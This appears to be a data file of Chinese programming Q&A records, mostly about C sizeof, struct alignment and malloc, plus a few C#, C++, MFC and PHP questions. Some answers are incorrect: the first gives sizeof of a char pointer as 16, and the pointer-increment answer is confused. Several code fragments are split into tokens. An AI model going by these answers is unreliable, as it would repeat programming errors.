{"Answer": "&lt;p&gt;中间的单独出现的斜杠是转义符&amp;#xff0c;不算长度。所以sizeof(s)为16&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["设有定义char*s=\"\\t\\\"Name\\\\Address\\\"\\n\"，则sizeof(s)的值为（", ["设有定义char*s=\"\\t\"Name\\Address\"\\n\"，则sizeof(s)的值为", "求详解，究竟哪个部分占几个字节"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;Executive summary:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;int a[17];\nsize_t n = sizeof(a)/sizeof(a[0]);\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;To determine the size of your array in bytes, you can use the &lt;code&gt;sizeof&lt;/code&gt;\noperator:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;int a[17];\nsize_t n = sizeof(a);\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;On my computer, ints are 4 bytes long, so n is 68.&lt;/p&gt;\n\n&lt;p&gt;To determine the number of elements in the array, we can divide\nthe total size of the array by the size of the array element.\nYou could do this with the type, like this:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;int a[17];\nsize_t n = sizeof(a) / sizeof(int);\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;and get the proper answer (68 / 4 = 17), but if the type of\n&lt;code&gt;a&lt;/code&gt; changed you would have a nasty bug if you forgot to change\nthe &lt;code&gt;sizeof(int)&lt;/code&gt; as well.&lt;/p&gt;\n\n&lt;p&gt;So the preferred divisor is &lt;code&gt;sizeof(a[0])&lt;/code&gt;, the size of the\nzeroeth element of the array.&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;int a[17];\nsize_t n = sizeof(a) / sizeof(a[0]);\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Another advantage is that you can now easily parameterize\nthe array name in a macro and get:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;#define NELEMS(x)  (sizeof(x) / sizeof((x)[0]))\n\nint a[17];\nsize_t n = NELEMS(a);\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["如何确定 c 语言中数组的大小？", ["\n\n", "How do I determine the size of my array in C? ", "\n\n", "That is, the number of elements the array can hold?", "\n    ", "\n\n", "转载于:https://stackoverflow.com/questions/37538/how-do-i-determine-the-size-of-my-array-in-c"]], "Tag": "程序设计"}
{"Answer": "(num1 + num2).ToString记得在后面加上括号，(num1 + num2).ToString()", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C#代码中出现的小问题，小白求指教", ["  private void equal_Click(object sender, EventArgs e)\n        {\n            int num1 = int.Parse(txtNum1.Text.Trim());\n            int num2 = Convert.ToInt32(txtNum2.Text.Trim());\n            switch (cboCaoZuoFu.Text.Trim())\n            {\n                case\"+\":\n                result.Text=(num1 + num2).ToString ;\n                break;\n                case\"-\":\n                result.Text = (num1 - num2).ToString;\n                break;\n                case\"*\":\n                result.Text = (num1 * num2).ToString;\n                break;\n                case\"/\":\n                result.Text = (num1 / num2).ToString;\n                break;\n                defaut:\n                result.Text = \"未知结果！\";\n                break;\n            }\n", "\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;第一个ch是char型&amp;#xff0c;所以size是1&amp;#xff0c;第二个‘A’的输出是个ASCII码65&amp;#xff0c;所以是整形&amp;#xff0c;size是4&amp;#xff0c;第三个是float型&amp;#xff0c;size也是4&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["sizeof（）能解释一下这段程序吗", []], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;p1 是字符串常量&amp;#xff0c;其长度为7 个字符&amp;#xff0c;但其所占内存大小为8 个byte。初学者往往忘了字符串常量的结束标志“\\0”。这样的话将导致p1 字符串中最后一个空字符“\\0”没有被拷贝到p2 中。解决的办法是加上这个字符串结束标志符&amp;#xff1a;&lt;/p&gt;\n&lt;p&gt;char *p2 &amp;#61; (char *)malloc(sizeof(char)&lt;em&gt;strlen(p1)&amp;#43;1&lt;/em&gt;sizeof(char));&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为指针分配内存，出现越界错误", ["为指针分配内存，出现越界错误。", "char *p1 = “abcdefg”;", "char *p2 = (char *)malloc(sizeof(char)*strlen(p1));", "strcpy(p2,p1);"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;我在vs2019上测试   大小是8啊&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/103987166256111.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["下面是一个结构体位域，结构体变量的内存大小不应该是8Byte吗，为什么是4Byte?", ["#", "include", " ", "<stdio.h>", "\n", "struct", " ", "EIGHT_BYTE", "\n{\n    ", "unsigned", " ", "char", " ccc1 : ", "1", ";\n    ", "unsigned", " ", "int", " ccc2 : ", "1", ";\n} eight_byte;\n\n", "int", " ", "main", "(", "int", " argc, ", "char", " ", "const", " *argv[])", "\n", "{\n    ", "printf", "(", "\"sizeof one_byte is : %lu\\n\"", ", ", "sizeof", "(one_byte));\n    ", "printf", "(", "\"sizeof two_byte is : %lu\\n\"", ", ", "sizeof", "(two_byte));\n    ", "printf", "(", "\"sizeof three_byte is : %lu\\n\"", ", ", "sizeof", "(three_byte));\n    ", "printf", "(", "\"sizeof four_byte is : %lu\\n\"", ", ", "sizeof", "(four_byte));\n    ", "printf", "(", "\"sizeof eight_byte is : %lu\\n\"", ", ", "sizeof", "(eight_byte));\n    ", "return", " ", "0", ";\n", "\n", "sizeof eight_byte is : 4"]], "Tag": "程序设计"}
{"Answer": "改成这样试试\r\n\r\n\r\n\r\n```\r\n void moveZeroes(vector&lt;int&gt;&amp; nums) {\r\n\tvector&lt;int&gt;::iterator  n;\r\n\r\n\tint nCount = 0;\r\n\tfor(n=nums.begin();n != nums.end();)\r\n\t{\r\n\t\tif((*n)==0)\r\n\t\t{\r\n\t\t\tn = nums.erase(n);\r\n\t\t\t//nums.push_back(0);\r\n\t\t\t++nCount;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tn++;\r\n\t\t}\r\n\t}\r\n\r\n\twhile(nCount &gt; 0)\r\n\t{\r\n\t\tnums.push_back(0);\r\n\t\t--nCount;\r\n\t}\r\n\r\n\tfor(n=nums.begin();n&lt;nums.end();n++)\r\n\t{\r\n\t\tcout&lt;&lt;*n&lt;&lt;\" \";\r\n\t}\r\n}\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["求助一个关于c++容器的问题", [" #include<iostream>\n#include<vector>\n\nusing namespace std;\n\nclass Solution {\npublic:\n    void moveZeroes(vector<int>& nums) {\n        vector<int>::iterator  n;\n        for(n=nums.begin();n<nums.end();n++)\n        {\n            if((*n)==0)\n            {\n                nums.erase(n);\n                nums.push_back(0);\n            }\n        }\n        for(n=nums.begin();n<nums.end();n++)\n        {\n            cout<<*n<<\" \";\n        }\n    }\n};\nint main()\n{\n    int i,j;\n    vector <int> nums;\n    for(i=0;i<5;i++)\n    {\n        cin>>j;\n        nums.push_back(j);\n    }\n    Solution s;\n    s.moveZeroes(nums);\n}\n\n", "\n\n", "程序如上，要求：把所有的0移动到容器尾部;", "\n如nums = [0, 1, 0, 3, 12], 调用函数之后, nums = [1, 3, 12, 0, 0]；", "\n然而,在输入num=[-1,2,-3,4,0,1,0,-2,0,0,1]后，", "\n我的输出却为：    [-1,2,-3,4,1,-2,0,1,0,0,0]；", "\n我觉得是因为nums.erase(n);返回位置为下一个数据的位置，循环中n++与其叠加，跳过了下一个数据造成的，", "\n然不知如何修改，请大神赐教！"]], "Tag": "程序设计"}
{"Answer": "STUDENT *p1 = MyScore; 类型不一致，MyScore是 STUDENT，p1是STUDENT *，", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于C语言结构体指针数组的问题", [" #include<stdio.h>\n\n//结构体\nstruct student\n{\n    int iNum;\n    char cName[16];\n    float fChineseScore;\n    float fMathScore;\n    float fEnglishScore;\n};\ntypedef struct student STUDENT;\n\n\n//输入\nvoid InputTranscript(STUDENT MyClass[], int num)\n{\n    int i;\n    printf(\"请输入学生的成绩信息：\\n\");\n    for (i = 0; i < num; i++)\n    {\n        scanf(\"%d %s %f %f %f\", &MyClass[i].iNum, MyClass[i].cName, &MyClass[i].fChineseScore, &MyClass[i].fMathScore, &MyClass[i].fEnglishScore);\n    }\n}\n\n//输出单体\nvoid DisplayTranscriptOne(STUDENT MyScore)\n{\n    int i;\n    STUDENT *p1 = MyScore;\n    printf(\"请输入需要显示成绩信息的学生的序号：\");\n    scanf(\"%d\", &i);\n    printf(\"输出学生的成绩信息：\\n\");\n    printf(\"%d %s %f %f %f\", (p1 + i) -> iNum, (p1 + i) -> cName, (p1 + i) -> fChineseScore, (p1 + i) -> fMathScore, (p1 + i) -> fEnglishScore);\n}\n\n\n//输出全体\nvoid DisplayTranscriptAll(STUDENT *MyClass, int num)\n{\n    printf(\"输出全体学生的成绩信息\\n\");\n    for (; MyClass < MyClass + num; MyClass++)\n    {\n        printf(\"%d %s %f %f %f\", MyClass -> iNum, MyClass -> cName, MyClass -> fChineseScore, MyClass -> fMathScore, MyClass -> fEnglishScore);\n    }\n}\n\n//修改\nvoid ModifyOne(STUDENT *MyInfo)\n{\n    int i;\n    printf(\"请输入需修改个人信息的学生的序号：\");\n    scanf(\"%d\", &i);\n    printf(\"请继续输入修改后的信息:\");\n    scanf(\"%d %s %f %f %f\", (MyInfo + i) -> iNum, &(MyInfo + i) -> cName, &(MyInfo + i) -> fChineseScore, &(MyInfo + i) -> fMathScore, &(MyInfo + i) -> fEnglishScore);\n}\n\nvoid main(void)\n{\n    STUDENT sTranscript[10]; \n    InputTranscript(sTranscript, 10);\n    DisplayTranscriptOne(sTranscript);\n    DisplayTranscriptAll(*sTranscript, 10);\n    ModifyOne(*sTranscript);\n}\n", "\n\n", "--------------------Configuration: 4 - Win32 Debug--------------------", "\nCompiling...", "\n4.c", "\nC:\\Users\\20453\\Desktop\\王俊森\\4\\4.c(30) : error C2115: 'initializing' : incompatible types", "\nC:\\Users\\20453\\Desktop\\王俊森\\4\\4.c(62) : error C2115: 'function' : incompatible types", "\nC:\\Users\\20453\\Desktop\\王俊森\\4\\4.c(62) : warning C4024: 'DisplayTranscriptOne' : different types for formal and actual parameter 1", "\nC:\\Users\\20453\\Desktop\\王俊森\\4\\4.c(63) : error C2115: 'function' : incompatible types", "\nC:\\Users\\20453\\Desktop\\王俊森\\4\\4.c(63) : warning C4024: 'DisplayTranscriptAll' : different types for formal and actual parameter 1", "\nC:\\Users\\20453\\Desktop\\王俊森\\4\\4.c(64) : error C2115: 'function' : incompatible types", "\nC:\\Users\\20453\\Desktop\\王俊森\\4\\4.c(64) : warning C4024: 'ModifyOne' : different types for formal and actual parameter 1", "\nError executing cl.exe.", "\n\n", "4.obj - 4 error(s), 3 warning(s)"]], "Tag": "程序设计"}
{"Answer": "```\r\n加上\r\n#include &lt;ctype.h&gt;\r\n\r\ntypedef ElementType;\r\n-&gt;\r\ntypedef char ElementType;\r\n\r\nCreatStack();\r\n-&gt;\r\nCreateStack();\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["[Error] ld returned 1 exit status 求问这个error怎么搞啊？？真的吐了。。", ["链式堆栈完成中缀表达式到后缀表达式的转换", "\n一直在gets函数报错，求问？？请问代码正确了吗。。", "\n\n", "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h> \n\n#define m 100\n/* run this program using the console pauser or add your own getch, system(\"pause\") or str loop */\n\ntypedef ElementType;\ntypedef struct SNode *PtrToSNode;\nstruct SNode {\n    ElementType Data;\n    PtrToSNode Next;\n};\ntypedef PtrToSNode Stack;\n\nStack CreateStack( ) \n{ /* 构建一个堆栈的头结点，返回该结点指针 */\n    Stack S;\n\n    S = (Stack)malloc(sizeof(struct SNode));\n    S->Next = NULL;\n    return S;\n}\n\nint IsEmpty ( Stack S )\n{ /* 判断堆栈S是否为空，若是返回true；否则返回false */\n    return ( S->Next == NULL );\n}\n\nvoid Push( Stack S, ElementType X )\n{ /* 将元素X压入堆栈S */\n    PtrToSNode TmpCell;\n\n    TmpCell = (PtrToSNode)malloc(sizeof(struct SNode));\n    TmpCell->Data = X;\n    TmpCell->Next = S->Next;\n    S->Next = TmpCell;\n\n}\n\nElementType Pop( Stack S )  \n{ /* 删除并返回堆栈S的栈顶元素 */\n    PtrToSNode FirstCell;\n    ElementType TopElem;\n\n    if( IsEmpty(S) ) {\n        printf(\"堆栈空\"); \n        return  0;\n    }\n    else {\n        FirstCell = S->Next; \n        TopElem = FirstCell->Data;\n        S->Next = FirstCell->Next;\n        free(FirstCell);\n        return TopElem;\n    }\n}\n\nvoid change(Stack S, ElementType str[])\n{\n    int i =0;\n    ElementType e;\n    CreatStack();\n    while(str[i]!='\\0')\n    {\n        while(isdigit(str[i]))\n        {\n            printf(\"%c\",str[i++]);\n            if(!isdigit(str[i]))\n            {\n                printf(\" \");\n            }\n        }\n        if(str[i]=='+'||str[i]=='-')\n        {   \n            if(S->Next=NULL)\n            {\n            Push(S,str[i]); \n            }   \n        else\n        {\n            do\n            {\n                Pop(S);\n                if(e=='(')\n                {\n                    Push(S, e);\n                }\n                else\n                {\n                    printf(\"%c\",e);\n                }\n            }\n            while(e!='(');\n            {\n                Push(S,str[i]);\n            }\n        }\n    }\n        else if(str[i]==')')\n        {\n            Pop( S);\n            while(e!='(')\n            {\n                printf(\"%c\",e);\n                Pop(S);\n            }\n        }\n        else if(str[i]=='*'||str[i]=='/'||str[i]=='(')\n        {\n            Push(S,str[i]);\n        }\n        else if(str[i]=='\\0')\n        {\n            break;\n        }\n        else\n        {\n            printf(\"\\n输入格式有误\\n\");\n            return;\n        }\n        i++;\n    }\n    while (str[i]='\\0')\n    {\n        Pop(S);\n        printf(\"%c\",e);\n    }\n}\n\nint main(int argc, char *argv[]) {\n    ElementType str[m];\n    gets(str);\n    Stack S;\n    change(S,str);\n    return 0;\n}\n\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;int类型&amp;#xff0c;每个占4个字节&amp;#xff0c;总共10个&amp;#xff0c;所以是40&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["求看看sizeof(b)为什么是40", ["这里讲的时候一掠而过了，但真的不懂，在我看来应该是4，问了几个同学也都是不理解。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;int占4字节,前面short和char能放在同一个四字节内部,(即[short short char xx],其中xx指对齐)故共计8字节&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["再补一道sizeof的题，基础不好请见谅", ["struct里按照取最大的算是12，也不是简单相加的7，为什么答案是8", "谢谢解答", "\n"]], "Tag": "程序设计"}
{"Answer": "首先我觉得你的返回值和函数锁定的返回值类型就不一致，定义的是返回结构体，实际上返回的是结构体指针；其次对于你的问题，malloc锁所申请的内存空间是堆空间，这部分的内存是需要程序员手动申请并且手动释放，否则没有默认的内存回收机制，就会导致内存泄漏，这个不用于直接定义变量所申请来的栈内存。所以你返回了malloc出来的内存地址head，那在主调函数中当然可以得到并访问这片空间。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言malloc内存分配的问题", ["利用malloc在子函数中分配的内存块为什么会传递回上层函数中？", "\n一下链表为证：", "\nNODE ", "create(int node_size)", "\n{", "\n        NODE *head;", "\n        NODE *leek;", "\n        NODE *znode;", "\n        //first node be made", "\n        head = (NODE", ")malloc(sizeof(NODE));", "\n        head->next = NULL;", "\n        head->data = 0;", "\n        leek = head;", "\n//      node_size--;", "\n        while(node_size--!=0)", "\n        {", "\n                znode = (NODE*)malloc(sizeof(NODE));", "\n                znode->next = NULL;", "\n                printf(\"input node data:\\n\");", "\n                scanf(\"%d\",&znode->data);", "\n                leek->next = znode;", "\n                leek = znode;", "\n        }", "\n        return head;", "\n}"]], "Tag": "程序设计"}
{"Answer": "strcpy(StreamFileInfo.szFileTitle,dlg.GetFileName());\r\n这里不应该用GetFileName()，它只获得文件名，不带路径。应该用GetPathName()，能够带全路径。如果你只用文件名，那么就会存储到相对路径下，就是你现在的工程路径", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于\tCFileDialog函数的使用问题", ["我在编一个CSocket的s/c模式的简单聊天程序，其中涉及到简单文件传输", "\n接收文件的时候用到了这个另存为的函数", "\n代码如下", "\nCSocket cliSock;", "\n    cliSock.Create();", "\n\n", "if(!cliSock.Connect((LPCTSTR)m_strip,1001))\n{\n    AfxMessageBox(\"未发送文件!\");\n    return;\n}\n\nSOCKET_STREAM_FILE_INFO StreamFileInfo;\ncliSock.Receive(&StreamFileInfo,sizeof(SOCKET_STREAM_FILE_INFO));\n\nCString type=StreamFileInfo.szFileTitle;\nconst   char *ty=(LPCTSTR)type;\nCFileDialog  dlg(false,ty,ty);\nif(IDOK!=dlg.DoModal())  return;\n\nstrcpy(StreamFileInfo.szFileTitle,dlg.GetFileName());\nCFile myFile(StreamFileInfo.szFileTitle, CFile::modeCreate | CFile::modeWrite | CFile::typeBinary);\n\nAfxMessageBox(StreamFileInfo.szFileTitle);\n\nUINT nSize=0;\nUINT nData=0;\n\nwhile (nSize < StreamFileInfo.nFileSizeLow)//分段接收\n{\n    byte * szBuf=new byte[1024];\n    nData=cliSock.Receive(szBuf, 1024);\n    myFile.Write(szBuf, nData);\n    nSize+=nData;\n}\nSetFileTime((HANDLE)myFile.m_hFile/*系统文件句柄*/,&StreamFileInfo.ftCreationTime/*文件创建时间*/,\n            &StreamFileInfo.ftLastAccessTime/*文件上一次访问时间*/,&StreamFileInfo.ftLastWriteTime)/*文件上一次修改时间*/;//设置文件的创建、访问、上次修改时间，\nmyFile.Close();\nSetFileAttributes(StreamFileInfo.szFileTitle,StreamFileInfo.dwFileAttributes);//设置文件属性\ncliSock.Close();\nAfxMessageBox(\"接收完毕！\");\n", "\n\n", "}", "\n\n", "\n\n", "CFileDialog  dlg(FALSE, NULL, ty,OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST | OFN_HIDEREADONLY, NULL);\n", "\n\n", "两个问题，", "\n第一，这个函数需要设置存储文件类型，难道我需要把所有传输文件类型都写上去么？有没有更好的办法？", "\n第二，程序运行后接收到的文件并没有存储到另存为窗口的指定文件夹，反而存储到了我编程文件的那个文件夹下面，问题在哪里？", "\n\n", "翻遍兜里也找不到可以悬赏的C币QAQ", "\n小妹是初学者，跪求指点！"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;字符常量在内存中占4个字节&amp;#xff0c;存放的是字符的ASCII码&amp;#xff08;整型数据&amp;#xff09;。 C语言规定所有字符常量都作为整型量来处理。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么字符常量所占字节是4而不是1", ["问题遇到的现象和发生背景", "\n", "#include \"stdio.h\"", "\n", "int main()", "{", "\n", "printf", "(", "\"%d\\n\"", ",sizeof(", "'a'", "));\n", "return", " ", "0", ";\n", "\n", "}", "\n", "字符常量所占字节为什么是4"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;字节对齐相关的知识点&lt;br /&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/575209404766199.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["这个结构体的内存图怎么画？", ["struct Five{", "     char a;", "     int b;", "     char c[10];", "     double d;", "};", "int main(){", "     printf(''five的字节数为%d\\n'',sizeof(five));", "     return 0;", "}", "正确答案是32。", "我画了两个内存结构图都没推出来。", "\n", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;000000629EF7F6A8  与  000000629EF7F6AC   就是相差 4个字节&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["内存与int之间的问题", ["\n", "#", "include", "<stdio.h>", "\n\n", "int", " ", "main", "()", " ", "{\n    \n    ", "int", " a[] = { ", "1", ",", "2", ",", "3", ",", "4", " };\n    ", "int", "* q = a;\n    ", "printf", "(", "\"%p\\n%p\\n\"", ", q, q+", "1", ");\n    ", "return", " ", "0", ";\n}\n\n", "\n", "输出为：", "000000629EF7F6A8", "000000629EF7F6AC", "q和q+1输出的内存地址只差了4个字符", "教学视频说两者差了一个sizeof（int），那也就是4个字节", "想请问一下为什么"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;For completeness, an outline approach specific to my issue:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;&amp;lt;!--filename:foo.php--&amp;gt;\n&amp;lt;?php\n  session_start();\n  if(isset($_POST['?confirm'])) {\n    $_SESSION['input']=$_FILES['input'];\n    header(\"HTTP/1.1 303\");\n    header(\"Location: http://$_SERVER[HTTP_HOST]/foo.php\");\n    die;\n  } else if(!empty($_SESSION['input'])) {\n    echo \"true&amp;lt;br&amp;gt;\";\n    session_unset();\n    session_destroy();\n  } else { echo \"false&amp;lt;br&amp;gt;\"; }\n?&amp;gt;\n&amp;lt;html&amp;gt;\n  &amp;lt;form action='foo.php' method='post' enctype='multipart/form-data'&amp;gt;\n    &amp;lt;input type='file' name='input' id='input'&amp;gt;&amp;lt;br&amp;gt;\n    &amp;lt;input type='submit' value='confirm' name='?confirm'&amp;gt;\n  &amp;lt;/form&amp;gt;\n&amp;lt;/html&amp;gt;\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Based on &lt;a href=\"https://wordsideasandthings.blogspot.co.uk/2013/04/post-redirect-get-pattern-in-php.html\" rel=\"nofollow noreferrer\"&gt;Post-Redirect-Get Pattern in PHP&lt;/a&gt;&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["对于html表单输入，PHP总是将$ _POST数组isset /！empty / sizeof> 0评估为true", ["\n\n", "I have a basic form to upload an image:", "\n\n", "<?php\n  if(!empty($_POST['?upload_img'])) {\n      echo \"true<br>\";\n  } else { echo \"false<br>\"; }\n?>\n\n<html>\n  <form action='' method='post' enctype='multipart/form-data'>\n    <input type='file' name='input_img' id='input_img'><br>\n    <input type='submit' value='Upload Image' name='?upload_img'>\n  </form>\n</html>\n", "\n\n", "I would like a PHP boolean/evaluation pair to run only once for each upload.", "\n\n", "I have tried evaluating using ", "!empty", ",", "isset", ",", "sizeof(foo)>0", " ", "\n\n", "I have also tried to find a solution using ", "$_SESSION", "s", "\n\n", "Is there are correct use of ", "unset", " or ", "$_POST=array()", "/", "$_FILE=array()", " that I have missed?", "\n\n", "I can achieve the desired behaviour with sessions:", "\n\n", "<?php\n  session_start();\n  if(!empty($_SESSION['foo'])) {\n    echo \"true<br>\";\n  } else { echo \"false<br>\"; }\n?>\n\n<html>\n  <?php\n    if(!sizeof($_SESSION['foo'])) {\n      $_SESSION['foo']=array();\n      $_SESSION['foo']['bar']=\"path/to/the/file.png\";\n    } else { $_SESSION=array(); }\n  ?>\n</html>\n", "\n\n", "How can I achieve the same with input from a ", "<form>", " instead?", "\n\n", "Any help is much appreciated!", "\n    "]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;测试可以啊&lt;br /&gt;你使用malloc需要导入&lt;code class=\"language-javascript\"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/code&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["vs malloc申请的空间无法访问", ["问题遇到的现象和发生背", "\n", "\n", "\n", "```c", "#include <stdio.h>", "\n", "struct ListNode {", "    int val;", "    struct ListNode* next;", "};", "\n", "int main() {", "    struct ListNode* p;", "    p= (struct ListNode*)malloc(sizeof(struct ListNode));", "    p->val = 0;", "    p->next = NULL;", "    printf(\"%d\\n%p\", p->val, p->next);", "    system(\"pause\");", "    return 0;", "}", "\n", "```问题相关代码，请勿粘贴截图 ", "\n", "\n", "\n", "运行结果及报错内容 ", "\n", "我的解答思路和尝试过的方法", "\n", "我想要达到的结果"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你使用&amp;#43;&amp;#43;p1&amp;#xff0c;地址就改变了&amp;#xff0c;p1&amp;#43;&amp;#43;先运算后自加。&amp;#43;&amp;#43;p1先自加&amp;#xff0c;然后运算&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["既然数组的指针的指针类型是int (*)[10] 那为什么p1++不是&a+sizeof(a)还是&a呢？", ["代码如下：", "\n", "#include<stdio.h>", "\n", "int", " main(){\n  ", "int", " a[", "10", "];\n  ", "int", " (*p1)[", "10", "] = &a;\n  ", "int", " *p2 = &a[", "0", "];\n  ", "int", " *p3 = a;\n  ", "printf", "(", "\"%p\"", ",p1++);", "//", "既然指针类型是", "int", " (*)[", "10", "] 那为什么p1++不是&a+sizeof(a)还是&a呢？\n  ", "printf", "(", "\"\\n%p\"", ",p2);\n  ", "printf", "(", "\"\\n%p\"", ",p3);\n}\n\n", "\n", "运行结果如下：", "\n"]], "Tag": "程序设计"}
{"Answer": "\"为什么没有send,消耗CPU更大\"    没有send, 循环一直在执行++i这个操作,一直在运算,cpu实际消耗很大.  如果有send, Windows我不清楚,linux send先要把数据从用户区copy\r\n到内核socket对应的发送缓冲区, 然后才会返回.这个操作比频繁的++i对cpu的实际消耗小.\r\n\r\n\"当总的CPU占用都是100%的时候,有send的时候电脑不感觉到卡\"  send函数实际上是个阻塞函数, cpu在等待copy完成的返回值, 可以让出cpu, 所以同是100%有send不感觉到卡..", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["同一个服务器,客户端就差一条send函数,为什么有send消耗CPU更少", ["libevent用多线程写了个服务器,刚在测试,无意中发现个不理解的现象", "\n服务器在自己的电脑上运行,再在自己的电脑上打开客户端,客户端很简单,就while循环里面发送数字 ", "\nwhile(1)", "\n{", "\n    send(sock,(char*)&i,sizeof(int),0);", "\n    ++i;", "\n    }", "\n    这样的客户端,打开20个,电脑也没有卡,但是如果把send那一句注释了,打开3个就会卡.", "\n    打开资源管理器看了下,单个客户端消耗内存都差不多,打开多少个都是600多K,", "\n    没有send的客户端,打开3个,单个占用Cpu 30%左右,", "\n    有send的客户端,打开3个,单个占用CPU 15%--20%左右,打开10个,单个占用CPu不到10%.", "\n    为什么没有send,消耗CPU更大,而且当总的CPU占用都是100%的时候,有send的时候电脑不感觉到卡"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;没问题&amp;#xff0c;但是整体的结构体大小应该需要是最大的那个变量的倍数&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言 sizeof（struct），当struct中出现数组时的结果变化", ["\n", "运行结果为24，但根据对变量的对齐，结果应该是7的倍数，例如按我计算应该是：4+1+3+4+2+7=21，但运行结果并不如此，希望", "帮忙解决一下。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;arr是指针,指针是固定分配8字节大小的空间&amp;#xff0c;存储指向的地址&lt;br /&gt;sizeof(arr)获取的是存储指向的地址的空间大小&lt;br /&gt;要获取数据的空间大小应该是sizeof(*arr)&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;如有帮助&amp;#xff0c;请点击我的回答下方的&lt;strong&gt;【采纳该答案】&lt;/strong&gt;按钮帮忙采纳下&amp;#xff0c;谢谢!&lt;br /&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/101342676936187.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;/blockquote&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["malloc()函数不按指定参数分配内存", ["cstdlib中的malloc(size_t_Size)函数可以给指针分配参数指定的空间，但最近遇到这么一个奇怪的问题：", "\n", "#", "include", "<iostream>", "\n", "#", "include", "<cstdlib>", "\n", "int", " ", "main", "()", "{\n    ", "typedef", " ", "struct", "{\n        ", "short", " cnt;\n        ", "char", " str[", "28", "];\n    }name;\n    name *arr=(name*)", "malloc", "(", "sizeof", "(name));\n    std::cout<<", "sizeof", "(name)<<", "'\\n'", "<<", "sizeof", "(arr)<<", "'\\n'", ";", "//调试", "\n    ", "system", "(", "\"pause\"", ");\n    ", "return", " ", "0", ";\n}\n", "\n", "这是我写一个程序时发现问题后的调试，发现最后malloc并没有给arr分配sizeof(name)这么大的空间，这是Dev-C++编译器中的结果", "右图可以看到，name的大小为30字节，但malloc只给arr分配了8字节大小的空间，这是什么原因？"]], "Tag": "程序设计"}
